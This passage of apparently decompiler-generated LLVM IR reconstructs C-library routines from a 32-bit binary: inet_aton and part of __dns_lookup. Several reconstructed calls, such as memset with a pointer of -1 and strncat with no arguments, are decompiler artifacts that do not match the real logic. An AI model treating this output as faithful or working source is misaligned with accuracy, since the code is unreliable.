  %v2_805548914 = load i8, i8* %v1_805548913, align 1
  %v3_805548915 = zext i8 %v2_805548914 to i32
  %v5_805548916 = and i32 %v4_8055489.pre, -256
  %v6_805548917 = or i32 %v3_805548915, %v5_805548916
  store i32 %v6_805548917, i32* @ecx, align 4
  %v4_805548b18 = icmp eq i8 %v2_805548914, 0
  %v1_805548d20 = icmp eq i1 %v4_805548b18, false
  br i1 %v1_805548d20, label %dec_label_pc_8055484, label %dec_label_pc_805548f

dec_label_pc_805549a:                             ; preds = %dec_label_pc_805548f, %entry
  br label %dec_label_pc_805549c

dec_label_pc_805549c:                             ; preds = %dec_label_pc_8055484, %dec_label_pc_805549a
  %v0_805549e = phi i32 [ 0, %dec_label_pc_805549a ], [ %v0_805548f31, %dec_label_pc_8055484 ]
  store i32 %v0_8055479, i32* @ebx, align 4
  ret i32 %v0_805549e

; uselistorder directives
  uselistorder i32 %v6_805548917, { 2, 0, 1 }
  uselistorder i8 %v2_805548914, { 1, 2, 0 }
  uselistorder i32 %v1_805548f, { 1, 0 }
  uselistorder i32 %v6_8055489, { 1, 2, 0 }
  uselistorder i8 %v2_8055489, { 1, 2, 0 }
  uselistorder i32 %v1_8055488, { 2, 1, 0 }
  uselistorder i8 %v2_805549025, { 0, 2, 1 }
  uselistorder i32 %v0_8055479, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805549c, { 1, 0 }
  uselistorder label %dec_label_pc_8055496, { 1, 0 }
  uselistorder label %dec_label_pc_805548f, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80554a7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80554a7, i32* @ecx, align 4
  %v1_80554ab = icmp eq i8* %arg1, null
  br i1 %v1_80554ab, label %dec_label_pc_805552c, label %dec_label_pc_80554af

dec_label_pc_80554af:                             ; preds = %entry
  %v0_80554ba.pre = load i32, i32* @global_var_80622cc, align 4
  br label %dec_label_pc_80554ba

dec_label_pc_80554ba:                             ; preds = %dec_label_pc_80554af, %dec_label_pc_8055503
  %v2_805550334 = phi i32 [ 1, %dec_label_pc_80554af ], [ %v3_8055503, %dec_label_pc_8055503 ]
  %v0_80554c033 = phi i32 [ %v4_80554a7, %dec_label_pc_80554af ], [ %v0_80554c03, %dec_label_pc_8055503 ]
  %v0_805552132 = phi i32 [ 0, %dec_label_pc_80554af ], [ %v2_8055509, %dec_label_pc_8055503 ]
  %v1_80554c0 = inttoptr i32 %v0_80554c033 to i8*
  %v2_80554c0 = load i8, i8* %v1_80554c0, align 1
  %v3_80554c0 = sext i8 %v2_80554c0 to i32
  %v2_80554c3 = mul nsw i32 %v3_80554c0, 2
  %v3_80554c3 = add i32 %v2_80554c3, %v0_80554ba.pre
  %v4_80554c3 = inttoptr i32 %v3_80554c3 to i8*
  %v5_80554c3 = load i8, i8* %v4_80554c3, align 1
  %v6_80554c3 = and i8 %v5_80554c3, 8
  %v7_80554c3 = icmp eq i8 %v6_80554c3, 0
  br i1 %v7_80554c3, label %dec_label_pc_805552c, label %dec_label_pc_80554ca

dec_label_pc_80554ca:                             ; preds = %dec_label_pc_80554ba
  %v4_80554de.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80554de

dec_label_pc_80554ce:                             ; preds = %dec_label_pc_80554de
  %v3_80554ce = mul i32 %v1_80554ce, 10
  %v2_80554d1 = add i32 %v3_80554ce, -48
  %v3_80554d1 = add i32 %v2_80554d1, %v2_80554e0
  %v1_80554d5 = add i32 %v3_80554d1, -255
  %v6_80554d5 = sub i32 254, %v3_80554d1
  %v7_80554d5 = and i32 %v6_80554d5, %v3_80554d1
  %v8_80554d5 = icmp slt i32 %v7_80554d5, 0
  %v9_80554d5 = icmp eq i32 %v1_80554d5, 0
  %v10_80554d5 = icmp slt i32 %v1_80554d5, 0
  %v3_80554db = icmp eq i1 %v10_80554d5, %v8_80554d5
  %v4_80554db = icmp eq i1 %v9_80554d5, false
  %v5_80554db = and i1 %v4_80554db, %v3_80554db
  br i1 %v5_80554db, label %dec_label_pc_805552c, label %dec_label_pc_80554dd

dec_label_pc_80554dd:                             ; preds = %dec_label_pc_80554ce
  %v1_80554dd = add i32 %v0_80554dd, 1
  store i32 %v1_80554dd, i32* @ecx, align 4
  br label %dec_label_pc_80554de

dec_label_pc_80554de:                             ; preds = %dec_label_pc_80554ca, %dec_label_pc_80554dd
  %v1_80554ce = phi i32 [ 0, %dec_label_pc_80554ca ], [ %v3_80554d1, %dec_label_pc_80554dd ]
  %v4_80554de = phi i32 [ %v4_80554de.pre, %dec_label_pc_80554ca ], [ %v6_80554de, %dec_label_pc_80554dd ]
  %v0_80554dd = phi i32 [ %v0_80554c033, %dec_label_pc_80554ca ], [ %v1_80554dd, %dec_label_pc_80554dd ]
  %v1_80554de = inttoptr i32 %v0_80554dd to i8*
  %v2_80554de = load i8, i8* %v1_80554de, align 1
  %v3_80554de = zext i8 %v2_80554de to i32
  %v5_80554de = and i32 %v4_80554de, -256
  %v6_80554de = or i32 %v3_80554de, %v5_80554de
  store i32 %v6_80554de, i32* @edx, align 4
  %v2_80554e0 = sext i8 %v2_80554de to i32
  %v2_80554e3 = mul nsw i32 %v2_80554e0, 2
  %v3_80554e3 = add i32 %v2_80554e3, %v0_80554ba.pre
  %v4_80554e3 = inttoptr i32 %v3_80554e3 to i16*
  %v5_80554e3 = load i16, i16* %v4_80554e3, align 2
  %v2_80554e8 = and i16 %v5_80554e3, 8
  %v3_80554e8 = icmp eq i16 %v2_80554e8, 0
  %v1_80554ea = icmp eq i1 %v3_80554e8, false
  br i1 %v1_80554ea, label %dec_label_pc_80554ce, label %dec_label_pc_80554ec

dec_label_pc_80554ec:                             ; preds = %dec_label_pc_80554de
  %v8_80554ec = sub nsw i32 2, %v2_805550334
  %v9_80554ec = and i32 %v8_80554ec, %v2_805550334
  %v10_80554ec = icmp slt i32 %v9_80554ec, 0
  %v11_80554ec = icmp eq i32 %v2_805550334, 3
  %v12_80554ec = icmp slt i32 %v2_805550334, 3
  %v3_80554f0 = icmp eq i1 %v12_80554ec, %v10_80554ec
  %v4_80554f0 = icmp eq i1 %v11_80554ec, false
  %v5_80554f0 = and i1 %v4_80554f0, %v3_80554f0
  br i1 %v5_80554f0, label %dec_label_pc_80554fa, label %dec_label_pc_80554f2

dec_label_pc_80554f2:                             ; preds = %dec_label_pc_80554ec
  %v10_80554f2 = icmp eq i8 %v2_80554de, 46
  %v1_80554f5 = icmp eq i1 %v10_80554f2, false
  br i1 %v1_80554f5, label %dec_label_pc_805552c, label %dec_label_pc_80554f7

dec_label_pc_80554f7:                             ; preds = %dec_label_pc_80554f2
  %v1_80554f7 = add i32 %v0_80554dd, 1
  store i32 %v1_80554f7, i32* @ecx, align 4
  br label %dec_label_pc_8055503

dec_label_pc_80554fa:                             ; preds = %dec_label_pc_80554ec
  %v1_80554fa = add i32 %v0_80554dd, 1
  store i32 %v1_80554fa, i32* @ecx, align 4
  %v4_80554fb = icmp eq i8 %v2_80554de, 0
  br i1 %v4_80554fb, label %dec_label_pc_8055503, label %dec_label_pc_80554ff

dec_label_pc_80554ff:                             ; preds = %dec_label_pc_80554fa
  %v2_80554ff = and i16 %v5_80554e3, 32
  %v3_80554ff = icmp eq i16 %v2_80554ff, 0
  br i1 %v3_80554ff, label %dec_label_pc_805552c, label %dec_label_pc_8055503

dec_label_pc_8055503:                             ; preds = %dec_label_pc_80554ff, %dec_label_pc_80554fa, %dec_label_pc_80554f7
  %v0_80554c03 = phi i32 [ %v1_80554fa, %dec_label_pc_80554ff ], [ %v1_80554fa, %dec_label_pc_80554fa ], [ %v1_80554f7, %dec_label_pc_80554f7 ]
  %v3_8055503 = add nuw nsw i32 %v2_805550334, 1
  %v2_8055506 = mul i32 %v0_805552132, 256
  %v2_8055509 = or i32 %v1_80554ce, %v2_8055506
  %v7_805550f = icmp sgt i32 %v2_805550334, 3
  br i1 %v7_805550f, label %dec_label_pc_8055511, label %dec_label_pc_80554ba

dec_label_pc_8055511:                             ; preds = %dec_label_pc_8055503
  %v4_8055511 = icmp eq i32 %arg2, 0
  br i1 %v4_8055511, label %dec_label_pc_805552e, label %dec_label_pc_805551d

dec_label_pc_805551d:                             ; preds = %dec_label_pc_8055511
  %v1_8055521 = call i32 @llvm.bswap.i32(i32 %v2_8055509)
  %v2_8055523 = inttoptr i32 %arg2 to i32*
  store i32 %v1_8055521, i32* %v2_8055523, align 4
  br label %dec_label_pc_805552e

dec_label_pc_805552c:                             ; preds = %dec_label_pc_80554ff, %dec_label_pc_80554f2, %dec_label_pc_80554ba, %dec_label_pc_80554ce, %entry
  br label %dec_label_pc_805552e

dec_label_pc_805552e:                             ; preds = %dec_label_pc_8055511, %dec_label_pc_805551d, %dec_label_pc_805552c
  %v0_8055533 = phi i32 [ 1, %dec_label_pc_8055511 ], [ 1, %dec_label_pc_805551d ], [ 0, %dec_label_pc_805552c ]
  ret i32 %v0_8055533

; uselistorder directives
  uselistorder i32 %v2_80554e0, { 1, 0 }
  uselistorder i32 %v6_80554de, { 1, 0 }
  uselistorder i8 %v2_80554de, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80554dd, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80554d5, { 1, 0 }
  uselistorder i32 %v3_80554d1, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80554c033, { 1, 0 }
  uselistorder i32 %v2_805550334, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 -255, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805552e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805552c, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80554de, { 1, 0 }
  uselistorder label %dec_label_pc_80554ba, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_805554a = call i32 @malloc(i32 512)
  store i32 %v2_805554a, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_805554a, i32* @ebp, align 4
  %v2_8055558 = call i32 @malloc(i32 1025)
  store i32 %v2_8055558, i32* %eax.global-to-local, align 4
  %v12_8055561 = ptrtoint i32* %stack_var_-236 to i32
  %v1_8055564 = icmp eq i32 %v2_805554a, 0
  br i1 %v1_8055564, label %dec_label_pc_8055bdd, label %dec_label_pc_805556c

dec_label_pc_805556c:                             ; preds = %entry
  %v1_805556c = icmp eq i32 %v2_8055558, 0
  br i1 %v1_805556c, label %dec_label_pc_8055bdd, label %dec_label_pc_8055574

dec_label_pc_8055574:                             ; preds = %dec_label_pc_805556c
  %v5_8055574 = icmp eq i32 %arg2, 0
  br i1 %v5_8055574, label %dec_label_pc_8055bdd, label %dec_label_pc_8055582

dec_label_pc_8055582:                             ; preds = %dec_label_pc_8055574
  %v4_8055582 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055582, i32* %eax.global-to-local, align 4
  %v2_8055589 = load i8, i8* %arg1, align 1
  %v3_8055589 = icmp eq i8 %v2_8055589, 0
  br i1 %v3_8055589, label %dec_label_pc_8055bdd, label %dec_label_pc_8055592

dec_label_pc_8055592:                             ; preds = %dec_label_pc_8055582
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_8055596 = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_8055596, i32* @eax, align 4
  store i32 %v4_8055582, i32* %edx.global-to-local, align 4
  %v2_80555b9 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_80555b9, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_80555c1 = call i32 @__pthread_return_void(i32 %v2_80555b9, i32 134562299)
  store i32 %v3_80555c1, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_80687e8.787 to i8*), i8** %stack_var_-252, align 4
  %v2_80555cd = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_80687e8.787 to i32))
  %v0_80555d2 = load i64, i64* @global_var_8068800.788, align 8
  %v1_80555d2 = trunc i64 %v0_80555d2 to i32
  %v1_80555d7 = ashr i32 %v1_80555d2, 31
  %v6_80555d8 = and i64 %v0_80555d2, 4294967295
  %v8_80555d8 = zext i32 %v1_80555d7 to i64
  %v9_80555d8 = mul nuw i64 %v8_80555d8, 4294967296
  %v10_80555d8 = or i64 %v9_80555d8, %v6_80555d8
  %v14_80555d8 = srem i64 %v10_80555d8, %tmp33
  %v15_80555d8 = trunc i64 %v14_80555d8 to i32
  %v0_80555df = load i16, i16* @global_var_8062544.789, align 4
  %v2_80555ee = load i8*, i8** %stack_var_-252, align 4
  %v3_80555ee = ptrtoint i8* %v2_80555ee to i32
  store i32 %v3_80555ee, i32* @eax, align 4
  store i32 134562299, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_80555f3 = call i32 @__pthread_return_void(i32 %v2_80555b9, i32 1)
  store i32 %v3_80555f3, i32* %eax.global-to-local, align 4
  %v4_805579a = inttoptr i32 %v15_80555d8 to i8*
  %v1_8055bb872 = add i32 %v12_8055561, 28
  %v2_8055bb873 = inttoptr i32 %v1_8055bb872 to i32*
  %v3_8055bb874 = load i32, i32* %v2_8055bb873, align 4
  %tmp = icmp ult i32 %v3_8055bb874, 3
  br i1 %tmp, label %dec_label_pc_8055618, label %dec_label_pc_8055bdd

dec_label_pc_8055618:                             ; preds = %dec_label_pc_8055592, %dec_label_pc_8055bb8.backedge
  %v0_805561f83 = phi i32 [ %v0_8055bb8.pre, %dec_label_pc_8055bb8.backedge ], [ %v12_8055561, %dec_label_pc_8055592 ]
  %v1_8055618 = add i32 %v0_805561f83, 20
  %v2_8055618 = inttoptr i32 %v1_8055618 to i32*
  %v3_8055618 = load i32, i32* %v2_8055618, align 4
  %v13_8055618 = icmp eq i32 %v3_8055618, -1
  br i1 %v13_8055618, label %dec_label_pc_8055618.dec_label_pc_805562e_crit_edge, label %dec_label_pc_805561f

dec_label_pc_8055618.dec_label_pc_805562e_crit_edge: ; preds = %dec_label_pc_8055618
  %v0_805562e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805562e

dec_label_pc_805561f:                             ; preds = %dec_label_pc_8055618
  %v3_8055622 = load i32, i32* %v2_8055618, align 4
  %v5_8055622 = add i32 %v0_805561f83, -16
  %v6_8055622 = inttoptr i32 %v5_8055622 to i32*
  store i32 %v3_8055622, i32* %v6_8055622, align 4
  %v1_8055626 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8055626, i32* %eax.global-to-local, align 4
  %v0_805562b = load i32, i32* @esp, align 4
  %v1_805562b = add i32 %v0_805562b, 16
  br label %dec_label_pc_805562e

dec_label_pc_805562e:                             ; preds = %dec_label_pc_8055618.dec_label_pc_805562e_crit_edge, %dec_label_pc_805561f
  %v1_805562e = phi i32 [ %v0_805561f83, %dec_label_pc_8055618.dec_label_pc_805562e_crit_edge ], [ %v1_805562b, %dec_label_pc_805561f ]
  %v0_805562e = phi i32 [ %v0_805562e.pre, %dec_label_pc_8055618.dec_label_pc_805562e_crit_edge ], [ %v1_8055626, %dec_label_pc_805561f ]
  %v2_805562e = add i32 %v1_805562e, -4
  %v3_805562e = inttoptr i32 %v2_805562e to i32*
  store i32 %v0_805562e, i32* %v3_805562e, align 4
  %v1_805562f = add i32 %v1_805562e, -8
  %v2_805562f = inttoptr i32 %v1_805562f to i32*
  store i32 512, i32* %v2_805562f, align 4
  %v1_8055634 = add i32 %v1_805562e, -12
  %v2_8055634 = inttoptr i32 %v1_8055634 to i32*
  store i32 0, i32* %v2_8055634, align 4
  %v2_8055636 = add i32 %v1_805562e, -16
  %v3_8055636 = inttoptr i32 %v2_8055636 to i32*
  store i32 %v2_805554a, i32* %v3_8055636, align 4
  %v4_8055637 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_80555d8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8055637, i32* %eax.global-to-local, align 4
  %v0_805563c = load i32, i32* @esp, align 4
  %v1_805563f = add i32 %v0_805563c, 8
  %v2_805563f = inttoptr i32 %v1_805563f to i32*
  store i32 48, i32* %v2_805563f, align 4
  %v1_8055641 = add i32 %v0_805563c, 4
  %v2_8055641 = inttoptr i32 %v1_8055641 to i32*
  store i32 0, i32* %v2_8055641, align 4
  %v1_8055643 = add i32 %v0_805563c, 84
  store i32 %v1_8055643, i32* @ebx, align 4
  %v3_8055647 = inttoptr i32 %v0_805563c to i32*
  store i32 %v1_8055643, i32* %v3_8055647, align 4
  %v4_8055648 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_80555d8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8055648, i32* %eax.global-to-local, align 4
  %v0_805564d = load i32, i32* @esp, align 4
  %v1_805564d = add i32 %v0_805564d, 72
  %v2_805564d = inttoptr i32 %v1_805564d to i32*
  %v3_805564d = load i32, i32* %v2_805564d, align 4
  store i32 %v3_805564d, i32* %eax.global-to-local, align 4
  %v1_8055651 = add i32 %v0_805564d, 116
  %v2_8055651 = inttoptr i32 %v1_8055651 to i32*
  store i32 1, i32* %v2_8055651, align 4
  %v0_8055659 = load i32, i32* @esp, align 4
  %v1_8055659 = add i32 %v0_8055659, 104
  %v2_8055659 = inttoptr i32 %v1_8055659 to i32*
  store i32 1, i32* %v2_8055659, align 4
  %v0_8055661 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055661 = add i32 %v0_8055661, 1
  %v1_8055662 = urem i32 %v1_8055661, 65536
  store i32 %v1_8055662, i32* %eax.global-to-local, align 4
  %v1_8055667 = load i32, i32* @esp, align 4
  %v2_8055667 = add i32 %v1_8055667, 72
  %v3_8055667 = inttoptr i32 %v2_8055667 to i32*
  store i32 %v1_8055662, i32* %v3_8055667, align 4
  %v0_805566b = load i32, i32* %eax.global-to-local, align 4
  %v1_805566b = load i32, i32* @esp, align 4
  %v2_805566b = add i32 %v1_805566b, 84
  %v3_805566b = inttoptr i32 %v2_805566b to i32*
  store i32 %v0_805566b, i32* %v3_805566b, align 4
  %v0_805566f = load i32, i32* @esp, align 4
  %v1_8055672 = add i32 %v0_805566f, 8
  %v2_8055672 = inttoptr i32 %v1_8055672 to i32*
  store i32 512, i32* %v2_8055672, align 4
  %v2_8055677 = add i32 %v0_805566f, 4
  %v3_8055677 = inttoptr i32 %v2_8055677 to i32*
  store i32 %v2_805554a, i32* %v3_8055677, align 4
  %v0_8055678 = load i32, i32* @ebx, align 4
  %v3_8055678 = inttoptr i32 %v0_805566f to i32*
  store i32 %v0_8055678, i32* %v3_8055678, align 4
  %v0_8055679 = call i32 @__encode_header()
  store i32 %v0_8055679, i32* %eax.global-to-local, align 4
  %v0_805567e = load i32, i32* @esp, align 4
  %v2_8055681 = icmp slt i32 %v0_8055679, 0
  store i32 %v0_8055679, i32* @ebx, align 4
  br i1 %v2_8055681, label %dec_label_pc_8055bdd, label %dec_label_pc_805568b

dec_label_pc_805568b:                             ; preds = %dec_label_pc_805562e
  %v2_805568b = add i32 %v0_805567e, 12
  %v3_805568b = inttoptr i32 %v2_805568b to i32*
  store i32 %v0_8055679, i32* %v3_805568b, align 4
  %v1_805568c = add i32 %v0_805567e, 8
  %v2_805568c = inttoptr i32 %v1_805568c to i32*
  store i32 1025, i32* %v2_805568c, align 4
  %v1_8055691 = add i32 %v0_805567e, 256
  %v2_8055691 = inttoptr i32 %v1_8055691 to i32*
  %v3_8055691 = load i32, i32* %v2_8055691, align 4
  %v5_8055691 = add i32 %v0_805567e, 4
  %v6_8055691 = inttoptr i32 %v5_8055691 to i32*
  store i32 %v3_8055691, i32* %v6_8055691, align 4
  %v1_8055698 = add i32 %v0_805567e, 28
  %v2_8055698 = inttoptr i32 %v1_8055698 to i32*
  %v3_8055698 = load i32, i32* %v2_8055698, align 4
  %v6_8055698 = inttoptr i32 %v0_805567e to i32*
  store i32 %v3_8055698, i32* %v6_8055698, align 4
  %v4_805569c = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_80555d8, i32 ptrtoint (i32* @0 to i32))
  %v0_80556a1 = load i32, i32* @esp, align 4
  %v1_80556a4 = add i32 %v0_80556a1, 8
  %v2_80556a4 = inttoptr i32 %v1_80556a4 to i32*
  store i32 ptrtoint (i32* @global_var_8062548.726 to i32), i32* %v2_80556a4, align 4
  %v1_80556a9 = add i32 %v0_80556a1, 4
  %v2_80556a9 = inttoptr i32 %v1_80556a9 to i32*
  store i32 134562299, i32* %v2_80556a9, align 4
  %v1_80556ae = add i32 %v0_80556a1, 200
  store i32 %v1_80556ae, i32* @eax, align 4
  %v3_80556b5 = inttoptr i32 %v0_80556a1 to i32*
  store i32 %v1_80556ae, i32* %v3_80556b5, align 4
  %v2_80556b6 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80555d8)
  store i32 %v2_80556b6, i32* %eax.global-to-local, align 4
  %v0_80556bb = load i32, i32* @esp, align 4
  %v1_80556bb = inttoptr i32 %v0_80556bb to i32*
  store i32 ptrtoint (i32* @global_var_8062548.726 to i32), i32* %v1_80556bb, align 4
  %v1_80556c2 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_80556c2, i32* %eax.global-to-local, align 4
  %v0_80556c7 = load i32, i32* @esp, align 4
  %v1_80556c7 = add i32 %v0_80556c7, 56
  %v2_80556c7 = inttoptr i32 %v1_80556c7 to i32*
  %v3_80556c7 = load i32, i32* %v2_80556c7, align 4
  store i32 %v3_80556c7, i32* %edx.global-to-local, align 4
  %v1_80556cb = add i32 %v0_80556c7, 268
  %v2_80556cb = inttoptr i32 %v1_80556cb to i32*
  %v3_80556cb = load i32, i32* %v2_80556cb, align 4
  store i32 %v3_80556cb, i32* %eax.global-to-local, align 4
  %v2_80556d2 = mul i32 %v3_80556c7, 4
  %v3_80556d2 = add i32 %v3_80556cb, %v2_80556d2
  %v4_80556d2 = inttoptr i32 %v3_80556d2 to i32*
  %v5_80556d2 = load i32, i32* %v4_80556d2, align 4
  store i32 %v5_80556d2, i32* %edx.global-to-local, align 4
  %v2_80556d5 = add i32 %v0_80556c7, 48
  %v3_80556d5 = inttoptr i32 %v2_80556d5 to i32*
  store i32 %v5_80556d2, i32* %v3_80556d5, align 4
  %v0_80556d9 = load i32, i32* @esp, align 4
  %v1_80556d9 = add i32 %v0_80556d9, 16
  %v1_80556dc = add i32 %v0_80556d9, 52
  %v2_80556dc = inttoptr i32 %v1_80556dc to i32*
  %v3_80556dc = load i32, i32* %v2_80556dc, align 4
  %v5_80556dc = icmp slt i32 %v3_80556dc, 0
  br i1 %v5_80556dc, label %dec_label_pc_805568b.dec_label_pc_8055722_crit_edge, label %dec_label_pc_80556e3

dec_label_pc_805568b.dec_label_pc_8055722_crit_edge: ; preds = %dec_label_pc_805568b
  %v0_8055722.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055722

dec_label_pc_80556e3:                             ; preds = %dec_label_pc_805568b
  store i32 %v3_80556dc, i32* %eax.global-to-local, align 4
  %v1_80556e7 = load i32, i32* @global_var_8068c38.790, align 8
  %v2_80556e7 = sub i32 %v3_80556dc, %v1_80556e7
  %v8_80556e7 = xor i32 %v1_80556e7, %v3_80556dc
  %v9_80556e7 = xor i32 %v2_80556e7, %v3_80556dc
  %v10_80556e7 = and i32 %v9_80556e7, %v8_80556e7
  %v11_80556e7 = icmp slt i32 %v10_80556e7, 0
  %v13_80556e7 = icmp slt i32 %v2_80556e7, 0
  %v2_80556ed = icmp eq i1 %v13_80556e7, %v11_80556e7
  br i1 %v2_80556ed, label %dec_label_pc_8055722, label %dec_label_pc_80556ef

dec_label_pc_80556ef:                             ; preds = %dec_label_pc_80556e3
  %v2_80556ef = add i32 %v0_80556d9, 12
  %v3_80556ef = inttoptr i32 %v2_80556ef to i32*
  store i32 %v3_80556dc, i32* %v3_80556ef, align 4
  %v1_80556f0 = add i32 %v0_80556d9, 8
  %v2_80556f0 = inttoptr i32 %v1_80556f0 to i32*
  store i32 1025, i32* %v2_80556f0, align 4
  %v1_80556f5 = add i32 %v0_80556d9, 4
  %v2_80556f5 = inttoptr i32 %v1_80556f5 to i32*
  store i32 ptrtoint (i32* @global_var_806173c.791 to i32), i32* %v2_80556f5, align 4
  %v1_80556fa = add i32 %v0_80556d9, 28
  %v2_80556fa = inttoptr i32 %v1_80556fa to i32*
  %v3_80556fa = load i32, i32* %v2_80556fa, align 4
  %v6_80556fa = inttoptr i32 %v0_80556d9 to i32*
  store i32 %v3_80556fa, i32* %v6_80556fa, align 4
  %v0_80556fe = call i32 @__GI_strncat()
  store i32 %v0_80556fe, i32* %eax.global-to-local, align 4
  %v0_8055703 = load i32, i32* @esp, align 4
  %v1_8055706 = add i32 %v0_8055703, 8
  %v2_8055706 = inttoptr i32 %v1_8055706 to i32*
  store i32 1025, i32* %v2_8055706, align 4
  %v1_805570b = add i32 %v0_8055703, 52
  %v2_805570b = inttoptr i32 %v1_805570b to i32*
  %v3_805570b = load i32, i32* %v2_805570b, align 4
  store i32 %v3_805570b, i32* %edx.global-to-local, align 4
  %v1_805570f = mul i32 %v3_805570b, 4
  %v2_805570f = add i32 %v1_805570f, 134646808
  %v3_805570f = inttoptr i32 %v2_805570f to i32*
  %v4_805570f = load i32, i32* %v3_805570f, align 4
  %v6_805570f = add i32 %v0_8055703, 4
  %v7_805570f = inttoptr i32 %v6_805570f to i32*
  store i32 %v4_805570f, i32* %v7_805570f, align 4
  %v1_8055716 = add i32 %v0_8055703, 28
  %v2_8055716 = inttoptr i32 %v1_8055716 to i32*
  %v3_8055716 = load i32, i32* %v2_8055716, align 4
  %v6_8055716 = inttoptr i32 %v0_8055703 to i32*
  store i32 %v3_8055716, i32* %v6_8055716, align 4
  %v0_805571a = call i32 @__GI_strncat()
  store i32 %v0_805571a, i32* %eax.global-to-local, align 4
  %v0_805571f = load i32, i32* @esp, align 4
  %v1_805571f = add i32 %v0_805571f, 16
  br label %dec_label_pc_8055722

dec_label_pc_8055722:                             ; preds = %dec_label_pc_805568b.dec_label_pc_8055722_crit_edge, %dec_label_pc_80556e3, %dec_label_pc_80556ef
  %v1_8055722 = phi i32 [ %v1_80556d9, %dec_label_pc_805568b.dec_label_pc_8055722_crit_edge ], [ %v1_80556d9, %dec_label_pc_80556e3 ], [ %v1_805571f, %dec_label_pc_80556ef ]
  %v0_8055722 = phi i32 [ %v0_8055722.pre, %dec_label_pc_805568b.dec_label_pc_8055722_crit_edge ], [ %v3_80556dc, %dec_label_pc_80556e3 ], [ %v0_805571a, %dec_label_pc_80556ef ]
  %v2_8055722 = add i32 %v1_8055722, -4
  %v3_8055722 = inttoptr i32 %v2_8055722 to i32*
  store i32 %v0_8055722, i32* %v3_8055722, align 4
  %v0_8055723 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055723 = add i32 %v1_8055722, -8
  %v3_8055723 = inttoptr i32 %v2_8055723 to i32*
  store i32 %v0_8055723, i32* %v3_8055723, align 4
  %v1_8055724 = add i32 %v1_8055722, -12
  %v2_8055724 = inttoptr i32 %v1_8055724 to i32*
  store i32 1, i32* %v2_8055724, align 4
  %v1_8055726 = add i32 %v1_8055722, 184
  store i32 %v1_8055726, i32* @eax, align 4
  %v2_805572d = add i32 %v1_8055722, -16
  %v3_805572d = inttoptr i32 %v2_805572d to i32*
  store i32 %v1_8055726, i32* %v3_805572d, align 4
  %v2_805572e = call i32 @__pthread_return_void(i32 -1, i32 %v15_80555d8)
  store i32 %v2_805572e, i32* %eax.global-to-local, align 4
  %v0_8055733 = load i32, i32* @esp, align 4
  %v1_8055733 = add i32 %v0_8055733, 28
  %v2_8055733 = inttoptr i32 %v1_8055733 to i32*
  %v3_8055733 = load i32, i32* %v2_8055733, align 4
  store i32 %v3_8055733, i32* %eax.global-to-local, align 4
  %v1_8055737 = add i32 %v0_8055733, 260
  %v2_8055737 = inttoptr i32 %v1_8055737 to i32*
  %v3_8055737 = load i32, i32* %v2_8055737, align 4
  store i32 %v3_8055737, i32* @edx, align 4
  %v1_805573e = add i32 %v0_8055733, 224
  %v2_805573e = inttoptr i32 %v1_805573e to i32*
  store i32 1, i32* %v2_805573e, align 4
  %v0_8055749 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055749 = load i32, i32* @esp, align 4
  %v2_8055749 = add i32 %v1_8055749, 216
  %v3_8055749 = inttoptr i32 %v2_8055749 to i32*
  store i32 %v0_8055749, i32* %v3_8055749, align 4
  %v1_8055755 = load i32, i32* @ebx, align 4
  %v2_8055755 = sub i32 512, %v1_8055755
  store i32 %v2_8055755, i32* %eax.global-to-local, align 4
  %v0_8055757 = load i32, i32* @edx, align 4
  %v1_8055757 = load i32, i32* @esp, align 4
  %v2_8055757 = add i32 %v1_8055757, 220
  %v3_8055757 = inttoptr i32 %v2_8055757 to i32*
  store i32 %v0_8055757, i32* %v3_8055757, align 4
